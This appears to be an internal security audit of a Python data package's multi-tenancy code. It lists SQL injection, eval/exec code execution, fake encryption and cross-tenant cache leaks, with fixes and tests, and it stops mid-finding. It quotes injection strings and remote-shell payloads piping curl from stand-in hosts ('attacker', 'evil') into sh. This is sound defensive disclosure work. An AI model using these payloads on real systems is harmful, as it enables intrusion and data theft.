# Tenancy + Security Audit — `packages/kailash-dataflow/src/dataflow/`

Scope: all tenant-isolation, trust-plane, cache, and SQL-handling surfaces.
Method: static read across `tenancy/`, `trust/`, `core/multi_tenancy.py`,
`features/multi_tenant.py`, `cache/`, `fabric/`, `nodes/`, `query/`,
`database/`, `migrations/`, `semantic/` with a security-first lens.

## Executive summary

DataFlow is **not** a multi-tenant-safe package today. It ships five
independent, overlapping tenancy systems (`core/multi_tenancy.py`,
`core/tenant_context.py`, `core/tenant_security.py`,
`tenancy/interceptor.py`, `tenancy/security.py`,
`features/multi_tenant.py`, `trust/multi_tenant.py`), none of which are
wired into the actual query path, the cache key path, or the fabric
runtime. The defenses that exist are in-process, in-memory, mutable, and
bypassable. The offenses (f-string SQL with tenant identifiers,
`eval()` on database rows, `exec()` on workflow config, unredacted
Redis URLs in logs, fake encryption, fake audit logs) are live and
exploitable today.

Total findings: **9 CRITICAL, 13 HIGH, 14 MEDIUM, 9 LOW**.

**Headline vulnerabilities (top 5):**

1. **CRITICAL** — `RowLevelSecurityStrategy.apply_isolation` interpolates
   `tenant_id` into a WHERE clause as a single-quoted string (5 sites
   at `core/multi_tenancy.py:415–429`). SQL injection via crafted
   `tenant_id` gives cross-tenant data exfiltration and arbitrary SQL
   execution.
2. **CRITICAL** — `semantic/search.py:134` calls `eval(row["embedding"])`
   on a database row. Any actor who can write to a vector column gets
   Python RCE on every search for similar items.
3. **CRITICAL** — `DynamicUpdateNode.async_run` calls
   `exec(self.filter_code, {}, namespace)` and
   `exec(self.prepare_code, ...)` at
   `nodes/dynamic_update.py:172, 182`. The two code fields are regular
   workflow node parameters — any caller who can construct a workflow
   can execute arbitrary Python in the DataFlow process.
4. **CRITICAL** — `TenantSecurityManager.encrypt_tenant_data` at
   `core/multi_tenancy.py:925–939` returns
   `f"encrypted_{encryption_key}_{data}"` with a hardcoded
   `"tenant_specific_key"` constant. Every call site that believes it
   is encrypting tenant data is storing plaintext with a fixed prefix.
5. **CRITICAL** — `CacheKeyGenerator` (`cache/key_generator.py:97–135`)
   has no per-call tenant dimension; `ExpressDataFlow._cache_get` /
   `_cache_set` in `features/express.py:954–996` reuse a
   single-process key across all tenants. With Redis wired via
   `auto_detect`, tenant-A can read tenant-B's cached rows.

Everything below is cited `file:line`, with attack, blast radius, fix
shape, and regression-test shape.

## CRITICAL vulnerabilities

### C1 — SQL injection via tenant_id in RLS policy builder (13 sites)

**Files/lines:**

- `core/multi_tenancy.py:415` — `query.replace("WHERE ", f"WHERE tenant_id = '{tenant_id}' AND ")`
- `core/multi_tenancy.py:420` — `f"WHERE tenant_id = '{tenant_id}' ORDER BY"`
- `core/multi_tenancy.py:424` — `f"WHERE tenant_id = '{tenant_id}' GROUP BY"`
- `core/multi_tenancy.py:427` — `f"WHERE tenant_id = '{tenant_id}' LIMIT"`
- `core/multi_tenancy.py:429` — `query.rstrip(";") + f" WHERE tenant_id = '{tenant_id}'"`
- `core/multi_tenancy.py:452` — `f"CREATE POLICY tenant_{tenant_id}_select ON {table_name} FOR SELECT USING (tenant_id = current_setting('row_security.tenant_id'))"`
- `core/multi_tenancy.py:456` — `f"CREATE POLICY tenant_{tenant_id}_modify ON {table_name} FOR ALL USING ..."`
- `core/multi_tenancy.py:477` — `f"SET row_security.tenant_id = '{tenant_id}'"`
- `core/multi_tenancy.py:482` — `f"SET row_security.user_id = '{user_id}'"`
- `core/multi_tenancy.py:490` — `f"DROP POLICY IF EXISTS tenant_{tenant_id}_select ON {table_name}"`
- `core/multi_tenancy.py:494` — `f"DROP POLICY IF EXISTS tenant_{tenant_id}_modify ON {table_name}"`
- `core/multi_tenancy.py:334` — `f"CREATE SCHEMA IF NOT EXISTS {schema_name}"` (schema_name is tenant-derived)
- `core/multi_tenancy.py:367` — `f"CREATE TABLE {schema_name}.{table_name} (...)"` (both attacker-controlled)

**Attack:** A caller supplies `tenant_id = "foo' OR '1'='1"`. After
`apply_isolation`, the resulting SQL becomes
`... WHERE tenant_id = 'foo' OR '1'='1' AND ...`. Every row of every
tenant is returned. For `create_tenant_policy`, a payload like
`tenant_id = "x; DROP TABLE users; --"` injects a DDL statement that
the caller's SQL connection will happily execute under whatever
privileges the application account holds (in most production setups,
enough to `DROP` application tables and read `pg_shadow`).

**PoC:**

```python
from dataflow.core.multi_tenancy import RowLevelSecurityStrategy, TenantContext, TenantConfig
s = RowLevelSecurityStrategy()
ctx = TenantContext(
    tenant_id="a' OR '1'='1",
    tenant_config=TenantConfig(tenant_id="a", name="t", isolation_strategy="row_level"),
)
print(s.apply_isolation("SELECT * FROM users WHERE active = 1", ctx))
# → SELECT * FROM users WHERE tenant_id = 'a' OR '1'='1' AND active = 1
# → returns all tenants' rows
```

`TenantConfig.__post_init__` at line 50 only rejects spaces in
`tenant_id`; quotes, semicolons, backticks, newlines, and comment
markers all pass.

**Blast radius:** Cross-tenant (every tenant whose data lives in the
same schema). For the DDL sites, cross-deployment (whole DB).

**Fix shape:** Delete `RowLevelSecurityStrategy.apply_isolation` and
every f-string DDL builder in this file. Replace with parameterized
execution via `dataflow/query/sql_builder.py` primitives
(`validate_identifier` + `?` placeholders). Enforce a strict
`^[a-zA-Z_][a-zA-Z0-9_]{0,62}$` validator on `tenant_id` at the
`TenantConfig.__post_init__` boundary per PR3.

**Regression test (Tier 2):** Real SQLite/PG instance. Register
`tenant_id = "a'; DROP TABLE t; --"` and assert the call raises
`ValueError` before any SQL executes; assert table `t` still exists
afterwards. Also a positive test for a benign tenant.

### C2 — `eval()` on database column in semantic search

**File/line:** `semantic/search.py:134`

**Code:** `eval(row["embedding"])` on the row returned from the
`SELECT embedding, content, metadata FROM {table} WHERE id = $1`
query (lines 119, 124). The table name is also interpolated
unchecked from `self.memory.vector_store.table_name`.

**Attack:** Anyone who can write a row with
`embedding = "__import__('os').system('curl http://attacker/sh | sh')"`
gains arbitrary code execution the next time
`find_similar_examples` is called. In multi-tenant setups this means
tenant-A (who can legitimately write vectors to their own data)
achieves RCE on the DataFlow worker that serves tenant-B's searches.

**Blast radius:** Cross-tenant, cross-process (RCE in worker).

**Fix shape:** Replace `eval` with `json.loads` — embeddings should be
persisted as JSON arrays of floats. Add a type check; reject non-list
results. Delete the f-string SQL: use the
`dataflow.query.sql_builder.validate_identifier` + `?` placeholder
pattern.

**Regression test:** Insert a row whose `embedding` column contains
a Python expression with a side effect. Call
`find_similar_examples`. Assert the side effect did NOT execute and
the method raises a parsing error.

### C3 — `exec()` on workflow parameter in DynamicUpdateNode

**File/lines:** `nodes/dynamic_update.py:172, 182`

**Code:**

```python
if self.filter_code.strip():
    exec(self.filter_code, {}, namespace)
...
if self.prepare_code.strip():
    exec(self.prepare_code, {}, namespace)
```

`filter_code` and `prepare_code` are set via the node constructor
(lines 90, 91, 106, 107), which is reachable via
`workflow.add_node("DynamicUpdateNode", "id", {"prepare_code": ...})`
— i.e., via any caller that can build a workflow. In a Nexus-facing
deployment, that is the HTTP API surface.

**Attack:**

```python
workflow.add_node("DynamicUpdateNode", "x", {
    "model_name": "User",
    "dataflow_instance": db,
    "prepare_code": "__import__('os').system('curl http://evil/shell.sh | sh')",
})
```

**Blast radius:** Full RCE on the DataFlow process. With Nexus or
any remote workflow-construction channel, cross-deployment.

**Fix shape:** Delete `DynamicUpdateNode` entirely. It is a covert
re-implementation of `PythonCodeNode`. If the user wants dynamic
update semantics, they call `db.express.update(model, id, fields)`
with the fields already computed in application code. This is a
`zero-tolerance.md` Rule 2 (stub disguised as production) + Rule 6
(half-implementation) + `framework-first.md` (parallel
implementation of `PythonCodeNode`) violation.

Also: add `DynamicUpdateNode` to the Nexus node allowlist blocklist
per PR6.

**Regression test:** Attempt to instantiate a `DynamicUpdateNode`
with any non-empty `prepare_code`; assert `ValueError` naming the
replacement `db.express.update` path.

### C4 — Fake encryption in `TenantSecurityManager.encrypt_tenant_data`

**File/lines:** `core/multi_tenancy.py:925–949`

**Code:**

```python
def encrypt_tenant_data(self, tenant_id: str, data: str) -> str:
    try:
        tenant_config = self.tenant_registry.get_tenant(tenant_id)
    except:
        pass
    encryption_key = self._get_tenant_encryption_key(tenant_id)
    encrypted_data = f"encrypted_{encryption_key}_{data}"
    logger.debug(f"Encrypted data for tenant: {tenant_id}")
    return encrypted_data

def _get_tenant_encryption_key(self, tenant_id: str) -> str:
    return "tenant_specific_key"
```

This is **plaintext storage with a fixed prefix**. Every caller that
believes it has encrypted secrets for a tenant has actually written
`"encrypted_tenant_specific_key_<their secret>"` to disk / over the
wire.

Additionally, `except: pass` at line 930 is a
`zero-tolerance.md` Rule 3 violation, and the docstring at line 1
claims "advanced multi-tenancy with … security controls".

**Blast radius:** Any data passed through this function. Blast radius
is only limited by the (unknown) number of callers; DataFlow exports
`TenantSecurityManager` from `core.tenant_security` for backwards
compatibility (line 9 of `core/tenant_security.py`).

**Fix shape:** Delete the method. Provide no drop-in replacement —
tenant-scoped encryption is out of scope for DataFlow and belongs in
the Trust Plane (`packages/kailash-trust-plane`) or in a dedicated
`kailash-secrets` package that wraps an HSM/KMS. If DataFlow callers
need "at-rest encryption" they must configure it at the database
layer (Postgres `pgcrypto`, file-system encryption) through a
DataFlow primitive that explicitly documents the boundary.

**Regression test:** Search the tree for any import of
`encrypt_tenant_data`; for each, either delete the call or file an
issue with the caller. After deletion, `grep -r encrypt_tenant_data`
returns zero results.

### C5 — Express cache has no tenant dimension (Redis wired)

**Files/lines:**

- `cache/key_generator.py:97–135` — `generate_express_key(model, op, params)` has no `tenant_id` parameter.
- `features/express.py:140` — `self._key_gen = CacheKeyGenerator()` (no namespace).
- `features/express.py:954–996` — `_cache_get` / `_cache_set` /
  `_invalidate_model_cache` pass only `(model, op, params)`.
- `features/express.py:129–136` — `CacheBackend.auto_detect(redis_url=...)` selects Redis if reachable.

**Attack:** Tenant-A calls `db.express.list("User", {"active": True})`.
Key is `dataflow:v1:User:list:<hash>`. Tenant-B calls the same
`db.express.list("User", {"active": True})` and gets tenant-A's cached
rows, including any columns tenant-B is not supposed to see. With
Redis, this leak is cross-process, cross-pod, and persists across
restarts until the TTL expires (default 300s).

**PoC:** Launch two DataFlow instances sharing a `REDIS_URL`. Write a
`tenant_id`-filtered User row under tenant-A's context. Call
`db.express.list("User", {"active": True})` under tenant-A. Call the
same under tenant-B without writing any users. Observe tenant-A's
rows in the tenant-B response.

**Blast radius:** Cross-tenant, cross-process, cross-pod.

**Fix shape:**

1. Add `tenant_id: Optional[str]` parameter to `generate_express_key`
   and make it the first non-prefix segment after the version.
2. `ExpressDataFlow._cache_get/set` must accept `tenant_id` and pass
   it through. The tenant comes from `dataflow/core/tenant_context.py`
   `get_current_tenant_id()` (which already exists) with a
   `require_tenant_when_multi_tenant_flag_set=True` contract.
3. `_invalidate_model_cache` must scope the pattern to the current
   tenant: `dataflow:v1:{tenant}:{model}:*`. Document the global-wipe
   path as a separate `clear_all_tenants_cache()` method reachable
   only by an admin surface.
4. When `multi_tenant=True` product flag is set and no tenant is in
   context, raise loudly (fail-closed, per trust-plane-security.md).

**Regression test (Tier 2):** Real Redis. Write under tenant-A,
read under tenant-B, assert zero rows. Also: write under tenant-A,
invalidate under tenant-B (they should NOT affect each other's
cache entries).

### C6 — Fabric cache `_cache_key` has no tenant dimension

**File/lines:** `fabric/pipeline.py:119–124`

```python
def _cache_key(product_name: str, params: Optional[Dict[str, Any]] = None) -> str:
    canonical = _canonical_params(params)
    if canonical:
        return f"{product_name}:{canonical}"
    return product_name
```

Products with `multi_tenant=True` (declared at `fabric/products.py:52,
71, 89, 111`) resolve to the same key regardless of tenant, so the
fabric materialized cache leaks across tenants even when the API
surface enforces an `X-Tenant-Id` header.

This is the issue #354 finding, confirmed. It pairs with:

### C7 — `FabricRuntime.tenant_extractor` is dead code

**File/lines:** `fabric/runtime.py:73, 85, 110–115`

`tenant_extractor` is accepted in the constructor, validated at
`_validate_params` (errors if `multi_tenant=True` and no extractor is
given), stored in `self._tenant_extractor` — and **never invoked**.
No caller in `pipeline.py`, `serving.py`, `consumers.py`,
`change_detector.py`, or `webhooks.py` references it.

**Attack:** Configure `FabricRuntime(..., multi_tenant=True,
tenant_extractor=lambda req: req.headers["X-Tenant-Id"])`. Every
request still collapses into a single cache key because the extractor
is never called. The validation passes, the fabric starts, the
operator believes multi-tenant isolation is active. It is not.

**Blast radius:** Cross-tenant for every fabric-served product.

**Fix shape:** FabricServingLayer must accept the extractor, call it
at request time, and propagate the result through `PipelineContext`
into `PipelineExecutor.compute_and_cache` / `get_cached` via a
`tenant_id` parameter on `_cache_key`. When the extractor returns
`None` and the product is `multi_tenant=True`, respond 400 (loud
failure, not silent pass-through).

### C8 — Bulk DML nodes build SQL with f-string interpolation and naive escaping

**Files/lines:**

- `nodes/bulk_delete.py:299, 312, 321` — `where_conditions.append(f"tenant_id = '{tenant_id}'")`, `quoted_ids = [f"'{id_val}'" if str else str(id_val) for id_val in ids]`, `select_query = f"SELECT * FROM {self.table_name} WHERE {where_clause}"`.
- `nodes/bulk_update.py:415–434, 598, 691, 816` — `escaped_value = value.replace("'", "''")`, then `set_clauses.append(f"{field} = '{escaped_value}'")`, and non-string values go through `str(value)` with no escaping (line 420), and `where_conditions = [f"id = {record_id}"]` (line 425) interpolates the record_id raw.
- `nodes/bulk_create.py:409–420` — same pattern.
- `nodes/bulk_upsert.py`, `nodes/dynamic_update.py` — same.
- All three execute with `validate_queries=False` (`bulk_update.py:442`), explicitly disabling whatever validation `AsyncSQLDatabaseNode` would provide.

**Attacks:**

1. `ids = ["1); DELETE FROM users WHERE ('1' = '1"]` — injected via
   the `ids` parameter to `BulkDeleteNode`.
2. `record_id = "0 OR 1=1"` — passed to `BulkUpdateNode`, bypasses the
   intended primary-key scope.
3. `value = 1.0; DROP TABLE users; --` via a non-string Python object
   whose `__str__` returns SQL — not hypothetical, since DataFlow
   does not enforce strict field types end-to-end (see C9).
4. `self.table_name` is an instance attribute set from node config;
   if workflow config is attacker-controllable, every DML is an
   arbitrary-table injection.

**Blast radius:** Cross-tenant (because `tenant_id` is also f-string
interpolated and bypassable via C1) and cross-deployment (DROP
TABLE, data exfiltration).

**Fix shape:** Rewrite every bulk node to build a parameter list and
use `?` placeholders. Use `validate_identifier` from
`query/models.py` on `table_name`, `field`, and `id`-style integers
cast via `int(...)`. Delete `validate_queries=False`.

### C9 — Hybrid/row-level `apply_isolation` is regex-based and bypassable

**File/lines:** `core/multi_tenancy.py:296–348, 405–431`

`SchemaIsolationStrategy.apply_isolation` does a blind
`query.replace("FROM ", f"FROM {schema_name}.")` — any query with
`FROM` in a comment, string literal, CTE, subquery, or JOIN gets
broken; worse, an attacker query that embeds `FROM ` in a literal
causes the substitution to write a broken SQL that is still
syntactically valid and targets an attacker-chosen table.

`RowLevelSecurityStrategy.apply_isolation` is the C1 sink. It also
has the same regex-based `WHERE `/`ORDER BY`/`GROUP BY`/`LIMIT`
substitution, which misses `Where`/`where`/tab-separated, comments,
unions, CTEs, etc.

**Fix shape:** Delete both. Query isolation must happen at the
parameterized query builder layer, not via string munging post-hoc.
Use `QueryInterceptor` in `tenancy/interceptor.py` (which at least
uses `?` placeholders for the tenant filter) and gate every write to
the `interceptor` execution path.

## HIGH vulnerabilities

### H1 — `MultiTenantManager` is a Python-dict fake

**File/lines:** `features/multi_tenant.py:1–95`

- Line 28: `"created_at": "2024-01-01T00:00:00Z"` — hardcoded timestamp.
- Line 85: `# In real implementation, would also delete all tenant data` — admission that `delete_tenant` is a stub.
- Line 72: `isolate_data` just assigns `data["tenant_id"] = target_tenant`, no DB enforcement.
- Line 15: `self._tenants = {}` — per-process in-memory dict; restart loses all state; multi-worker setups each see a different universe.
- Module docstring (line 4) says "Enterprise multi-tenant data isolation and management" — docstring lie.
- "Enterprise" branding violates `rules/independence.md` (no enterprise vs community split).

**Fix shape:** Delete the module. Replace its call sites with
`TenantContextSwitch` from `core/tenant_context.py` (which is the
only real implementation in the tree).

### H2 — Parallel, overlapping tenancy implementations

Seven separate tenancy systems exist, none fully wired:

1. `core/multi_tenancy.py` — `TenantRegistry`, `TenantContext`, `TenantManager`, `TenantSecurityManager`, `TenantMigrationManager`, `TenantMiddleware`, three strategy classes.
2. `core/tenant_context.py` — `TenantContextSwitch`, `TenantInfo`, `contextvars`-based (the best of the bunch, but line 7 has a live `TODO-155` marker — `zero-tolerance.md` Rule 2 violation).
3. `core/tenant_security.py` — re-exports `TenantSecurityManager` from #1 (dead shim).
4. `core/tenant_migration.py` — separate migration manager with own lock model.
5. `tenancy/interceptor.py` — `QueryInterceptor` (regex SQL parser, `?` placeholders).
6. `tenancy/security.py` — `TenantSecurityManager` with in-memory policies, rate limits, audit logs, blocks — separate from #1's `TenantSecurityManager`.
7. `features/multi_tenant.py` — the H1 fake.
8. `trust/multi_tenant.py` — `TenantTrustManager` (in-memory delegation storage, not persisted).
9. `fabric/products.py` — `multi_tenant` flag that nothing consumes.

None call into any other. A change to tenant behavior can only be made
in ~five of the systems and hope the caller picked the right one.

**Fix shape:** Pick ONE. `core/tenant_context.py` is the closest to
correct. Delete the other six, replace call sites with the canonical
module, make `trust/multi_tenant.py` the ONLY cross-tenant
delegation store (backed by PostgreSQL, not a dict).

### H3 — `TenantContextSwitch` has a live `TODO-155` marker

**File/line:** `core/tenant_context.py:7`

> `TODO-155: Context Switching Capabilities`

Production code MUST NOT contain `TODO` markers
(`zero-tolerance.md` Rule 2). The feature is implemented; delete the
marker.

### H4 — `TenantTrustManager` stores delegations in memory

**File/line:** `trust/multi_tenant.py:295`

```python
self._delegations: Dict[str, CrossTenantDelegation] = {}
```

Delegations are per-process. Multi-worker deploys see divergent state.
A delegation revoked on worker-A is not revoked on worker-B until
restart. No `maxlen` bound — eatp.md requires `maxlen=10000`. Per
`trust-plane-security.md` MUST Rule 4.

**Fix shape:** Persist to PostgreSQL through DataFlow's own
`@db.model` facility. Add a bounded in-memory LRU cache in front if
lookups matter. Add `maxlen=10000` to the (now only-cache) deque
while migration is pending.

### H5 — `CrossTenantDelegation` dataclass is not frozen

**File/line:** `trust/multi_tenant.py:62–111`

```python
@dataclass
class CrossTenantDelegation:
    ...
```

No `frozen=True`. `trust-plane-security.md` MUST Rule 4: all
security-critical dataclasses must be frozen. Any caller holding a
reference can mutate `allowed_operations`, `row_filter`, or flip
`revoked=False` after-the-fact.

**Fix shape:** `@dataclass(frozen=True)`. Use
`object.__setattr__(self, ...)` in `revoke()` paths if in-place
revocation is still desired, or construct a new dataclass and
replace the dict entry.

### H6 — `DataFlowAuditStore._records` is unbounded and memory-only

**File/line:** `trust/audit.py:313`

```python
self._records: List[SignedAuditRecord] = []
```

- No persistence (restart = lost audit trail).
- No `maxlen=10000` bound — grows until OOM.
- `clear_records()` at line 640 is reachable from any caller with no
  role check, warning-only in logs (line 651).
- `eatp.md` requires `maxlen=10000` with 10% trim at capacity.

**Fix shape:** Switch to a `deque(maxlen=10000)` in-memory tail AND
persist every record to a DataFlow `@db.model AuditRecord` with an
append-only constraint (Postgres trigger or DataFlow retention
policy). Make `clear_records()` an admin-only method that requires a
caller-supplied reason and a PACT permission check.

### H7 — `verify_cross_tenant_access` non-strict mode silently permits

**File/line:** `trust/multi_tenant.py:429–436`

```python
else:
    # Non-strict mode: log warning but allow
    logger.warning(...)
    return (True, None)
```

`strict_mode` defaults to `True` at the constructor (line 287), but
the non-strict path exists and logs-and-permits is explicitly
prohibited by `rules/zero-tolerance.md` Rule 3 AND by
`rules/eatp.md` § "Fail-closed".

**Fix shape:** Delete the non-strict path. Make `strict_mode`
non-configurable. Log the attempt and return `(False, reason)`.

### H8 — `TenantSecurityManager` (tenancy) audit logs are in-memory only

**File/lines:** `tenancy/security.py:81, 499–529`

- `self._audit_logs: List[SecurityAuditLog] = []` (line 81) — no persistence.
- Rolling trim at line 529 (keeps last 10,000), but no external sink.
- Rate limits (line 82) and blocked tenants (line 83) also in-memory.
- `get_audit_logs` is the only export — callers can't get logs out for SIEM shipping.

**Fix shape:** Switch to a durable sink (DataFlow model, OpenTelemetry
log exporter). Add a "tamper-evident chain" like `trust/audit.py`
already does for its own records.

### H9 — Rate-limit state collisions across processes

**File/line:** `tenancy/security.py:82, 475–497`

`_rate_limits: Dict[str, List[datetime]]` is per-process. With
multiple workers, each worker has its own rate-limit counter, so the
effective rate cap is `N_workers × max_queries_per_minute`. Under
autoscaling, the cap is unbounded.

**Fix shape:** Redis-backed rate limiting (HSET + EXPIRE, or Lua
script for atomicity). Add a MUST rule in `.claude/rules/` banning
per-process rate-limit state in production code.

### H10 — `QueryBuilder._quote_identifier` does not escape internal quotes

**File/line:** `database/query_builder.py:441–453`

```python
def _quote_identifier(self, identifier: str) -> str:
    parts = identifier.split(".")
    if self.database_type == DatabaseType.POSTGRESQL:
        quoted_parts = [f'"{part}"' for part in parts]
    ...
```

An identifier of `field = 'foo"; DROP TABLE t; --'` becomes
`"foo"; DROP TABLE t; --"`, which terminates the quoted identifier
and opens an injection sink. No `^[a-zA-Z_][a-zA-Z0-9_]*$` validation
before quoting (PR3 violation).

Also: `QueryBuilder.having(condition: str)` at line 255 takes a raw
SQL string into `self.having_conditions` with no validation — a
direct injection sink. Same for `join(on_condition)` at line 225.
`limit` / `offset` at lines 215–218 store user-supplied integers
without `isinstance(int)` checking, then f-string them into the
query at lines 311–313.

**Fix shape:** Replace `_quote_identifier` with
`validate_identifier` + dialect-specific quoting (as `query/sql_builder.py`
does). Change `having`/`join` to accept a structured condition
object (`column, operator, value`) like `where`, not a raw string.
Coerce `limit`/`offset` to `int` at assignment.

### H11 — Cache `auto_detection.py` logs full Redis URL

**File/lines:** `cache/auto_detection.py:146, 152, 220`

```python
f"Attempted connection to: {redis_url or 'redis://localhost:6379/0'}"
...
f"Redis server available - using async Redis adapter at {redis_url}"
...
f"Failed to connect to Redis at {redis_url}. Ensure Redis server is running."
```

If `REDIS_URL = "redis://user:SuperSecret42@prod-cache.aws.com/0"`,
that password goes to stdout at WARN/INFO/ERROR. `rules/security.md`
§ "No secrets in logs". `rules/observability.md` MUST Rule 4. PR8.

Also, the parser at lines 70, 157, 201 is naive:

```python
url_parts = redis_url.replace("redis://", "").split("/")
host_port = url_parts[0].split(":")
host = host_port[0]
port = int(host_port[1]) if len(host_port) > 1 else 6379
```

It silently drops any user/password portion of the URL, so a URL
with credentials is accepted and the resulting connection omits the
credentials — the connection either fails to authenticate (confusing
error) or connects as the default user (cross-tenant leak if the
default user has broader read access). No support for `rediss://`,
no support for Unix sockets. PR8 violation.

**Fix shape:** Use `urllib.parse.urlsplit`. Call
`mask_sensitive_values` (already available at
`core/logging_config.py:259`) on every log line. Validate scheme is
in `{"redis", "rediss", "unix"}`. Reject `host == "0.0.0.0"`.

### H12 — f-string DDL across migrations with no identifier validation

**Files/lines:** 30+ sites in `migrations/`, e.g.:

- `migrations/auto_migration_system.py:627, 640, 693, 694, 709, 757, 814, 821, 825, 837, 841, 1291, 1304, 1383, ...`
- `migrations/application_safe_rename_strategy.py:321, 408, 435, 440, 448, 451, 462, 538, 550`
- `migrations/not_null_handler.py:730, 868`
- `migrations/rename_coordination_engine.py:321`
- `migrations/fk_safe_migration_executor.py:414`
- `migrations/production_deployment_validator.py:726`

Every `table_name`, `column.name`, `constraint_name`, `schema_name`
is interpolated into DDL strings. There is no
`validate_identifier` call in the entire `migrations/` tree (grep
confirms zero matches). If any of these identifiers come from a
non-Python-source-code origin (YAML config, DB model registry
populated at runtime, API parameter, migration file loaded from
disk), every DDL is an injection sink.

**Fix shape:** Add `validate_identifier` at the boundary of every
migration function that accepts a name. Document a MUST rule:
"identifier values in DDL MUST pass `validate_identifier` before
interpolation, AND MUST be quoted with the dialect's identifier
quoting."

### H13 — `escape_value` single-quote doubling is insufficient

**File/lines:** `nodes/bulk_update.py:415`, `nodes/bulk_create.py:409`

```python
escaped_value = value.replace("'", "''")
row_values.append(f"'{escaped_value}'")
```

Single-quote doubling defends only against the trivial `'` payload.
It does not defend against:

- Backslash escaping in MySQL `NO_BACKSLASH_ESCAPES=OFF` mode, where `\'` terminates the literal.
- Unicode normalization tricks (`U+0027`, `U+2018`, etc., depending on the DB collation).
- Non-string values bypassing the branch entirely (line 420).
- The `field` identifier being attacker-controlled (no `validate_identifier` on the SET/INSERT column names).

**Fix shape:** Parameterize. Delete the `escape_value` primitive.

## MEDIUM vulnerabilities

### M1 — `TrustAwareQueryExecutor` "disabled" mode bypasses everything

**File/lines:** `trust/query_wrapper.py:800–824, 935–964`

```python
if self._enforcement_mode == "disabled":
    try:
        result = await self._dataflow.execute({"model": model_name, **filter})
        ...
```

`"disabled"` is a valid enforcement mode. It skips table-access
verification, constraint application, PII filtering, and audit logging.
A single misconfiguration
(`enforcement_mode=os.environ.get("TRUST_MODE")` with empty env var
defaulting to disabled) quietly removes every safeguard.

**Fix shape:** Remove `"disabled"` from `valid_modes`. If a caller
wants to skip trust checks, they must NOT use the wrapper.

### M2 — `TrustAwareQueryExecutor` returns `{"error": str(e)}` to callers

**File/lines:** `trust/query_wrapper.py:819, 892, 957, 1028`

PR5 violation: raw exception strings leak implementation details
(SQL error text, stack trace fragments, password-bearing URLs from
connection errors) into the response payload.

**Fix shape:** Catch, log with structured fields, return a generic
error code + a correlation ID. The caller can request detail via
the log with the ID.

### M3 — `TenantConfig.__post_init__` identifier validator is too weak

**File/line:** `core/multi_tenancy.py:49`

```python
if " " in self.tenant_id:
    raise ValueError("Invalid tenant ID")
```

Rejects only spaces. Accepts quotes, semicolons, newlines, unicode,
path traversal (`../../`), null bytes. This is the root of C1's
exploitability.

**Fix shape:** Strict `^[a-zA-Z_][a-zA-Z0-9_\-]{0,62}$` at the
constructor. Same for `user_id`, `name`.

### M4 — Nonce backend key is not tenant-scoped

**File/line:** `fabric/webhooks.py:60, 85`

```python
key = f"{source_name}:{nonce}"    # in-memory
key = f"fabric:webhook:nonces:{source_name}"  # Redis
```

Multiple tenants subscribing to the same source name share a nonce
namespace. Tenant-A can replay its own nonce into tenant-B's webhook
processor. Also a cross-tenant DoS: tenant-A can send a flood of
webhooks with predictable nonces, exhausting the 10,000-entry LRU
and forcing eviction of tenant-B's valid nonces.

**Fix shape:** `key = f"fabric:webhook:nonces:{tenant_id}:{source_name}"`.
Enforce the tenant dimension in the webhook receiver.

### M5 — `fabric/auth.py` OAuth2 state can span tenants

**File/lines:** `fabric/auth.py:43, 73, 164` (seen via grep)

The OAuth2 `validate_url_safe` is applied to `token_url`, but the
token cache (if any) and the refresh token store are not documented.
Needs a dedicated read.

### M6 — `ChangeDetector` has no tenant dimension

**File/line:** `fabric/change_detector.py` (per fabric auditor, same instance)

Change events flow through a single `on_change` callback. If two
tenants each have a product depending on the same source, the
change for tenant-A's data triggers recompute for tenant-B too.

### M7 — `QueryInterceptor` uses regex SQL parsing

**File/lines:** `tenancy/interceptor.py:483–952`

`_extract_tables`, `_extract_where_conditions`, `_extract_joins`,
`_extract_set_columns`, `_extract_parameters` are all regex-based.
This is a known-brittle approach. Any query using CTEs, `WITH`,
window functions, quoted identifiers, or comments will parse
incorrectly. The `_validate_sql_syntax` pattern list (lines 883–921)
is a blacklist of "common typos" — unsafe as a security boundary.

The interceptor is the only tenancy path that actually uses `?`
parameters (lines 695, 708, 773, 784, 804, 815), so it is the best
candidate for "one canonical path" in H2. But the parser must be
replaced with `sqlparse`'s real token walking, not regex.

**Fix shape:** Replace regex extraction with `sqlparse`-based
token-level extraction. Add a fuzz test with `hypothesis-sql`.

### M8 — `except Exception: return value or None` without action

**Files/lines:**

- `features/express.py:327` — `except Exception: pass # Best-effort read-back`
- `core/multi_tenancy.py:930–932` — `except: pass` on a `get_tenant` path
- `trust/multi_tenant.py:613` — `logger.warning(...); return []`

All are `zero-tolerance.md` Rule 3 violations.

### M9 — `SchemaIsolationStrategy.create_tenant_resources` logs success and returns True without executing

**File/lines:** `core/multi_tenancy.py:308–314`

```python
def create_tenant_resources(self, tenant_config: TenantConfig) -> bool:
    schema_name = f"tenant_{tenant_config.tenant_id}"
    # In a real implementation, this would execute CREATE SCHEMA
    logger.info(f"Creating schema: {schema_name}")
    return True
```

Stub returning `True`. Every caller that believes it just created a
tenant schema has done nothing. Also `cleanup_tenant_resources` at
316–322, `RowLevelSecurityStrategy.create_tenant_resources` at
433–439, 441–447 — same pattern.

### M10 — `TenantMigrationManager._extract_tenant_data` is `return {"users": [{"id": 1, "name": "Test"}]}`

**File/line:** `core/multi_tenancy.py:847–850`

```python
def _extract_tenant_data(self, db, tenant_id: str, strategy: str):
    return {"users": [{"id": 1, "name": "Test"}]}
```

Hardcoded fake data. Same for `_load_tenant_data` at 852–857 and
`_restore_from_backup` at 859–862. `zero-tolerance.md` Rule 2.

### M11 — `TenantMiddleware._extract_tenant_id` only reads headers

**File/line:** `core/multi_tenancy.py:988–995`

```python
if hasattr(request, "headers"):
    return request.headers.get("X-Tenant-ID")
return None
```

Returns `None` on missing header — silent fail. If a downstream
caller does `with TenantManager().set_tenant_context(None):` the
context is cleared, and subsequent queries run with no tenant
filter. Fail-open behavior.

**Fix shape:** Raise a `MissingTenantContextError` when the header is
required (multi-tenant deployment) and missing. `fail-closed` per
eatp.md.

### M12 — `DataFlowAuditStore.__init__` warns but does not refuse to start with no signing key

**File/lines:** `trust/audit.py:323–327`

```python
if not signing_key:
    logger.warning("DataFlowAuditStore initialized without signing key. ...")
```

In production, missing signing key MUST be fail-closed (refuse to
start), not log-warn-and-proceed.

**Fix shape:** Add an `allow_unsigned=False` default. Raise on no
signing key unless the caller explicitly opts in for dev.

### M13 — `Query audit logs` use unstructured f-strings

**File/lines:** `core/multi_tenancy.py:701, 1017` —
`logger.info(f"Executing tenant query: {modified_query}")`

The modified query contains the (now parameterized) SQL, which is
